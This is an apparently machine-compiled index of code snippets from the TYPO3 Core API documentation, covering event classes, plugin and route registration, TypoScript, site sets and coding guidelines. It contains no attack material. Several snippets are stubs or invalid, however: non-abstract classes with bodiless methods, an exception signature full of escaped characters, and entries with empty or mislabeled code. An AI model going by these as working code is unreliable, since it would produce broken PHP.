}\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Extbase Plugin in TYPO3 CMS\nDESCRIPTION: This code snippet shows the usage of registerPlugin() method in Configuration/TCA/Overrides/tt_content.php file to register an Extbase plugin in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CreatePlugins.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nregisterPlugin()\n```\n\n----------------------------------------\n\nTITLE: Defining Ajax Route Configuration in TYPO3\nDESCRIPTION: Creates an Ajax route configuration that maps a URL path to a controller action. The configuration defines a route named 'example_dosomething' that points to the doSomethingAction method in the ExampleController class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Extension/Configuration/BackendAjaxRoutes.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nreturn [\n    'example_dosomething' => [\n        'path' => '/example/do-something',\n        'target' => \\Vendor\\MyExtension\\Controller\\ExampleController::class . '::doSomethingAction',\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Configuring JavaScript Modules for TYPO3 Extension in PHP\nDESCRIPTION: This code snippet defines the configuration for JavaScript modules in a TYPO3 extension. It specifies dependencies on 'core' and 'backend', sets a tag for the backend context menu, and defines an import path for the extension's JavaScript files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/ContextMenu/JavaScriptModules.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    'dependencies' => ['core', 'backend'],\n    'tags' => [\n        'backend.contextmenu',\n    ],\n    'imports' => [\n        '@t3docs/examples/' => 'EXT:examples/Resources/Public/JavaScript/',\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Incorrect For Loop Example in PHP\nDESCRIPTION: An example of an incorrect for loop in PHP, illustrating the banning of function calls in loop statements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_16\n\nLANGUAGE: php\nCODE:\n```\nfor ($element = 0; $element < count($dataArray); $element++) {\n    // Process element here\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterRequestDispatchedEvent Class Methods\nDESCRIPTION: Class definition with methods for accessing request and response objects after dispatch. The class provides access to the request interface and PSR-7 response interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/AfterRequestDispatchedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Extbase\\Event\\Mvc;\n\nclass AfterRequestDispatchedEvent\n{\n    public function getRequest(): \\TYPO3\\CMS\\Extbase\\Mvc\\RequestInterface\n    {\n    }\n\n    public function getResponse(): \\Psr\\Http\\Message\\ResponseInterface\n    {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring LinkHandler in TypoScript for Book Reports\nDESCRIPTION: This TypoScript configuration demonstrates how to set up the LinkHandler for book reports, which are stored as news records but displayed on a separate detail page.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.bookreports  {\n   typolink {\n      parameter = 987\n      additionalParams.data = field:uid\n      additionalParams.wrap = &tx_news_pi1[controller]=News&tx_news_pi1[action]=detail&tx_news_pi1[news]=|\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Username for TYPO3\nDESCRIPTION: This snippet configures the username for SMTP authentication in TYPO3. It is required when the SMTP transport method is selected. The configuration is stored in the global TYPO3 configuration variable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_11\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_username']\n:type: text\n:Default: ''\n\n*only with transport=smtp* If your SMTP server requires authentication, enter your username here.\n```\n\n----------------------------------------\n\nTITLE: Standard Exception Signature in PHP\nDESCRIPTION: Defines a constructor for custom exceptions with parameters for message, code, and previous exception. It highlights setting a unique code using a Unix timestamp and emphasizes the importance of a meaningful message.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/WorkingWithExceptions.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\npublic function __construct(\\n    string \\$message = \\\"\\\",\\n    int \\$code = 0,\\n    \\\\Throwable \\$previous = null,\\n) {\\n    // ... the logic\\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Cache Allowance in TYPO3 CMS Frontend\nDESCRIPTION: This method checks whether caching is currently allowed in the Frontend. It returns a boolean value indicating the caching status. This can be used to determine if caching should be performed in various parts of the rendering process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/CacheInstruction.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\npublic function isCachingAllowed(): bool\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 AfterPageColumnsSelectedForLocalizationEvent Class Definition\nDESCRIPTION: PHP class that defines the event triggered after page column selection for translation in TYPO3's backend. It provides methods to manage column configurations, access backend layout data, and handle record information for the translation process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterPageColumnsSelectedForLocalizationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass AfterPageColumnsSelectedForLocalizationEvent {\n    public function getColumns(): array;\n    public function setColumns(array $columns): void;\n    public function getColumnList(): array;\n    public function setColumnList(array $columnList): void;\n    public function getBackendLayout(): \\TYPO3\\CMS\\Backend\\View\\BackendLayout\\BackendLayout;\n    public function getRecords(): array;\n    public function getParameters(): array;\n}\n```\n\n----------------------------------------\n\nTITLE: Multiline String Concatenation in PHP\nDESCRIPTION: Demonstrates the correct format for multiline string concatenation with proper placement of operators according to TYPO3 PHP guidelines.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_19\n\nLANGUAGE: php\nCODE:\n```\n$content = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. '\n                . 'Donec varius libero non nisi. Proin eros.';\n```\n\n----------------------------------------\n\nTITLE: Implementing Empty Checkbox Handling in TYPO3 CMS HTML Forms\nDESCRIPTION: This snippet shows how to handle empty checkboxes in TYPO3 CMS forms. It uses the 'data-empty-value' attribute to specify a value to be sent when the checkbox is unchecked. Additional attributes are used for change events and navigation actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Forms/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<input\n    type=\"checkbox\"\n    name=\"setting\"\n    value=\"1\"\n    data-empty-value=\"0\"\n    data-global-event=\"change\"\n    data-action-navigate=\"$data=~s/$value/\"\n>\n```\n\n----------------------------------------\n\nTITLE: Defining Allowed Module Data Properties in TYPO3 Backend Module Configuration\nDESCRIPTION: This snippet shows how to define allowed properties with their default values in the module registration configuration file. These properties can be overwritten via GET/POST requests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleDataObject.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n'moduleData' => [\n    'allowedProperty' => '',\n    'anotherAllowedProperty' => true,\n],\n```\n\n----------------------------------------\n\nTITLE: Managing TCA in TYPO3 using PHP\nDESCRIPTION: The TCA (Table Configuration Array) is crucial for managing table configurations within TYPO3. It is loaded through the `Bootstrap::loadExtensionTables()` function and partially accessible in the frontend. The TCA Reference provides a detailed guide to its structure and usage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_1\n\n\n\n----------------------------------------\n\nTITLE: Registering Services with Operating System Dependency\nDESCRIPTION: Code example showing how to register OS-dependent services in TYPO3 CMS using the ExtensionManagementUtility::addService() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/Implementing.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'os' => 'UNIX',\n\n// runs only on Windows\n'os' => 'WIN',\n\n// no special dependency\n'os' => '',\n```\n\n----------------------------------------\n\nTITLE: Running Specific Tests with PHPUnit Filter\nDESCRIPTION: Command to run a specific test case or method using PHPUnit's filter option. This allows for targeted testing of individual components.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nphp vendor/bin/phpunit -c Build/phpunit/UnitTests.xml --filter \"MyTest\"\n```\n\n----------------------------------------\n\nTITLE: Using AddJavaScriptModulesEvent Event Listener in TYPO3 PHP\nDESCRIPTION: An example implementation of an event listener for the AddJavaScriptModulesEvent in TYPO3. This code demonstrates how to add a JavaScript module to handle custom events in user settings configurations, although the referenced methods have been removed in TYPO3 v13.0.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Setup/AddJavaScriptModulesEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\UserSettings\\EventListener;\n\nuse TYPO3\\CMS\\Setup\\Event\\AddJavaScriptModulesEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AddJavaScriptModulesEvent $event): void\n    {\n        $event->addModule(\n            'TYPO3/CMS/MyExtension/SomeJavaScriptModule'\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Canonical Link Tag in HTML (RST)\nDESCRIPTION: This snippet demonstrates the HTML structure for a canonical link tag, which is automatically added by TYPO3 when the EXT:seo extension is installed. The canonical link helps prevent duplicate content penalties by indicating the original source of the content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n:html:`<link rel=\"canonical\" href=\"\">`\n```\n\n----------------------------------------\n\nTITLE: Listing Available Site Sets via CLI\nDESCRIPTION: This bash command demonstrates how to retrieve a list of available site sets using the TYPO3 console command.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 site:sets:list\n```\n\n----------------------------------------\n\nTITLE: Installing Multiple TYPO3 Core Extensions in One Command\nDESCRIPTION: Example of requiring multiple TYPO3 core packages in a single Composer command. This approach simplifies installation by combining requirements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncomposer require typo3/minimal:^12.4 typo3/cms-scheduler:^12.4 ...\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Site Package in YAML\nDESCRIPTION: This YAML configuration defines a TYPO3 site package named 't3docs/site-package' with the label 'Site Package'. It specifies dependencies on 'typo3/fluid-styled-content' and 'typo3/fluid-styled-content-css'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/_Sets/_site-package/_config.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: t3docs/site-package\nlabel: 'Site Package'\ndependencies:\n  - typo3/fluid-styled-content\n  - typo3/fluid-styled-content-css\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents in reStructuredText for TYPO3 JavaScript Modules\nDESCRIPTION: This snippet defines a table of contents using reStructuredText syntax. It lists various JavaScript modules used in the TYPO3 backend, including Modals, MultiStepWizard, DocumentService, and SessionStorageWrapper.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. toctree::\n   :maxdepth: 1\n   :titlesonly:\n\n   Modals\n   MultiStepWizard\n   DocumentService\n   SessionStorageWrapper\n```\n\n----------------------------------------\n\nTITLE: Including TYPO3 Documentation Structure and Creating Index in reST\nDESCRIPTION: Sets up a reStructuredText documentation page with TYPO3 standard includes, adds an index entry for 'Extension development; How to', and creates a hierarchical table of contents that links to subpages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reST\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index::\n   Extension development; How to\n.. _extension-howto:\n\n==============================\nHowto\n==============================\n\nHelps you kickstart your own extension or sitepackage. Explains how\nto publish an extension. Contains howto for different situations\nlike creating a frontend plugin, a backend module or to extend\nexisting TCA.\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    */Index\n    *\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFolderDeletedEvent Class in TYPO3 CMS Core Resource\nDESCRIPTION: This snippet defines the BeforeFolderDeletedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class represents an event that is fired before a folder is deleted, allowing listeners to clean up external references to the folder or its contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFolderDeletedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFolderDeletedEvent\n{\n    public function getFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileAddedToIndexEvent Class in TYPO3 Core Resource API\nDESCRIPTION: This PHP class definition outlines the AfterFileAddedToIndexEvent which is triggered after a file is indexed in TYPO3. The class provides methods to access the file UID and the record data, allowing developers to extend file metadata.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileAddedToIndexEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileAddedToIndexEvent\n{\n    // This event is fired once an index was just added to the database (= indexed).\n    // Examples: Allows to additionally populate custom fields of the sys_file/sys_file_metadata database records.\n    \n    public function getFileUid(): int\n    {\n        // Returns the file UID\n    }\n    \n    public function getRecord(): array\n    {\n        // Returns the record array\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Services in TYPO3 Extension YAML\nDESCRIPTION: Example configuration file for defining services, dependency injection, and service container setup in a TYPO3 extension using Services.yaml\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/ServicesYaml.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Example Services.yaml configuration\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Context Menu Actions in TYPO3 JavaScript\nDESCRIPTION: Defines a JavaScript class that handles custom context menu actions in TYPO3. The code implements a 'helloWorld' action that shows an error notification when triggered on page items. The class is exported as a singleton instance for use in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/ContextMenu/ContextMenuActions.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n/**\n * Module: @t3docs/examples/context-menu-actions\n *\n * JavaScript to handle the click action of the \"Hello World\" context menu item\n */\n\nclass ContextMenuActions {\n\n\thelloWorld(table, uid) {\n\t\tif (table === 'pages') {\n\t\t\t//If needed, you can access other 'data' attributes here from $(this).data('someKey')\n\t\t\t//see item provider getAdditionalAttributes method to see how to pass custom data attributes\n\t\t\ttop.TYPO3.Notification.error('Hello World', 'Hi there!', 5);\n\t\t}\n\t};\n}\n\nexport default new ContextMenuActions();\n```\n\n----------------------------------------\n\nTITLE: Database Table Naming Conventions for Extbase Domain Models\nDESCRIPTION: Demonstrates the recommended naming pattern for database tables in Extbase domain models\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/NamingConventions.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\ntx_<extkeyprefix>_domain_model_<model-name>\n```\n\n----------------------------------------\n\nTITLE: Preventing Automatic Deletion of ENABLE_INSTALL_TOOL File in TYPO3\nDESCRIPTION: This snippet shows the content to be added to the ENABLE_INSTALL_TOOL file to prevent its automatic deletion. This feature should only be used during local development.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/_includes/_EnableInstallToolWarning.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nKEEP_FILE\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFolderRenamedEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the AfterFolderRenamedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class is used to handle events after a folder has been renamed, allowing for custom processing or permission adjustments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFolderRenamedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFolderRenamedEvent\n{\n    public function getFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Implementation not shown\n    }\n\n    public function getSourceFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom GitHub Link Handler in TYPO3 PHP\nDESCRIPTION: This class implements TYPO3's LinkHandlerInterface to handle GitHub links. It formats URLs to GitHub issues based on configuration settings and link parts, generating a complete GitHub URL with project, action, and optional issue number.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_GitHubLinkHandlerFormatCurrentUrl.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass GitHubLinkHandler implements LinkHandlerInterface\n{\n    public function formatCurrentUrl(): string\n    {\n        $issue = '';\n        if (isset($this->linkParts['issue'])) {\n            $issue = $this->linkParts['issue'];\n        }\n        return sprintf(\n            'https://github.com/%s/%s/%s',\n            $this->configuration['project'],\n            $this->configuration['action'],\n            $issue,\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Module Execution Code Example in PHP\nDESCRIPTION: Demonstrates optional module execution code that instantiates the class and runs its methods.  This code is typically found in `eID` scripts and old Backend modules and appears after the PHP class definition.  It uses `GeneralUtility::makeInstance()` to create an instance of the class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/FileStructure.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$someClass = GeneralUtility::makeInstance(SomeClass::class);\n    $someClass->main();\n```\n\n----------------------------------------\n\nTITLE: Backend Module Configuration PHP\nDESCRIPTION: Configures a backend module with a specific submodule key within the web module\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/NamingConventions.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'web_productmanagement' => [\n        'parent' => 'web',\n        // ...\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Extending Functional Test Case in TYPO3\nDESCRIPTION: Base class for creating functional tests in TYPO3, providing setup and isolation mechanisms for test scenarios\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Introduction.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nTYPO3\\TestingFramework\\Core\\Functional\\FunctionalTestCase\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyPageLinkConfigurationEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to create an event listener for the ModifyPageLinkConfigurationEvent in TYPO3. It shows how to modify the page link configuration, including changing the target page ID and adding custom query parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/ModifyPageLinkConfigurationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\Event\\ModifyPageLinkConfigurationEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyPageLinkConfigurationEvent $event): void\n    {\n        // Change the target page ID\n        $event->setPageId(123);\n\n        // Add custom query parameters\n        $queryParameters = $event->getQueryParameters();\n        $queryParameters['custom'] = 'parameter';\n        $event->setQueryParameters($queryParameters);\n\n        // Modify the URL fragment\n        $event->setFragment('modified-section');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Dependency Injection in Extbase Validator\nDESCRIPTION: Example of using dependency injection in an Extbase validator by utilizing constructor method for injecting dependencies\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/CustomValidator/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nclass MyCustomValidator extends AbstractValidator {\n    public function __construct(\n        private SomeService $someService\n    ) {}\n\n    protected function isValid($value) {\n        // Use injected service for validation\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for BeforeFileAddedEvent in TYPO3\nDESCRIPTION: Class definition for BeforeFileAddedEvent that provides methods to handle file operations before they are added to the TYPO3 Resource Storage. Includes methods for accessing and modifying the filename, source path, target folder, storage, and driver information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFileAddedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFileAddedEvent\n{\n    public function getFileName(): string;\n    public function setFileName(string $fileName);\n    public function getSourceFilePath(): string;\n    public function getTargetFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder;\n    public function getStorage(): \\TYPO3\\CMS\\Core\\Resource\\ResourceStorage;\n    public function getDriver(): \\TYPO3\\CMS\\Core\\Resource\\Driver\\DriverInterface;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Subject Instance in PHP Unit Test\nDESCRIPTION: Demonstrates a simple way to create an instance of the class under test directly in each test method, rather than using setUp(). This approach can improve test readability and simplicity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Introduction.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$subject = new MyClass()\n```\n\n----------------------------------------\n\nTITLE: EntityUpdatedInPersistenceEvent Class Definition in TYPO3 Extbase\nDESCRIPTION: Documents the EntityUpdatedInPersistenceEvent class from the TYPO3 Extbase persistence framework. This event is fired after an object/entity has been sent to the persistence layer to be updated, and provides a method to retrieve the updated domain object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/EntityUpdatedInPersistenceEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Extbase\\Event\\Persistence;\n\nclass EntityUpdatedInPersistenceEvent\n{\n    public function getObject(): \\TYPO3\\CMS\\Extbase\\DomainObject\\DomainObjectInterface;\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing Doctrine Statement Class in PHP\nDESCRIPTION: The fully qualified class name for the Doctrine Statement class that represents the result object returned by SELECT or COUNT queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ClassOverview/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\nDoctrine\\DBAL\\Driver\\Statement\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeTypoLinkEncodedEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the BeforeTypoLinkEncodedEvent class in the TYPO3\\CMS\\Core\\LinkHandling\\Event namespace. The class allows listeners to modify TypoLink parameters before encoding and provides methods for parameter manipulation and retrieval.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/LinkHandling/BeforeTypoLinkEncodedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\LinkHandling\\Event\n\n..  php:class:: BeforeTypoLinkEncodedEvent\n\n    Listeners are able to modify the to be encoded TypoLink parameters\n\n    ..  php:method:: getParameters()\n        :returns: `array`\n\n    ..  php:method:: setParameters(array $parameters)\n\n        :param $parameters: the parameters\n\n    ..  php:method:: getTypoLinkParts()\n        :returns: `array`\n\n    ..  php:method:: getDelimiter()\n        :returns: `string`\n\n    ..  php:method:: getEmptyValueSymbol()\n        :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Configuring Views via TypoScript in TYPO3\nDESCRIPTION: This snippet shows how to configure view settings using TypoScript in TYPO3 Extbase. It is essential for setting up view parameters and ensuring proper rendering of content. Make sure TypoScript setup is correctly included in your TYPO3 instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/View/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\include:: /CodeSnippets/Extbase/View/TypoScript.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Importing Routes into Site Configuration using SiteConfigurationLoadedEvent in PHP\nDESCRIPTION: This code snippet demonstrates an event listener that adds a route enhancer configuration to the site configuration automatically. It checks if the configuration already exists and adds it if not present.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Configuration/SiteConfigurationLoadedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Configuration\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Configuration\\Event\\SiteConfigurationLoadedEvent;\n\nfinal class ImportRoutesIntoSiteConfiguration\n{\n    public function __invoke(SiteConfigurationLoadedEvent $event): void\n    {\n        $configuration = $event->getConfiguration();\n\n        if (!isset($configuration['routeEnhancers']['MyPlugin'])) {\n            $configuration['routeEnhancers']['MyPlugin'] = [\n                'type' => 'Plugin',\n                'limitToPages' => [\n                    // Extend or replace with your page uid\n                    1,\n                ],\n                'namespace' => 'tx_myplugin',\n                'routePath' => '/my-plugin/{article_title}',\n                'aspects' => [\n                    'article_title' => [\n                        'type' => 'PersistedSlugifiedPatternMapper',\n                        'tableName' => 'tx_myplugin_domain_model_article',\n                        'routeFieldPattern' => '^(?P<path_segment>.+)$',\n                        'routeFieldResult' => '{path_segment}',\n                    ],\n                ],\n            ];\n\n            $event->setConfiguration($configuration);\n        }\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Directory Structure of Generated Extension\nDESCRIPTION: Displays the file structure created by the Make extension for a new TYPO3 extension, showing folders and files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: none\nCODE:\n```\n$ tree src/extensions\n└── my-test\n    ├── Classes\n    ├── Configuration\n    |   └── Services.yaml (optional)\n    ├── composer.json\n    └── ext_emconf.php (optional)\n```\n\n----------------------------------------\n\nTITLE: Defining 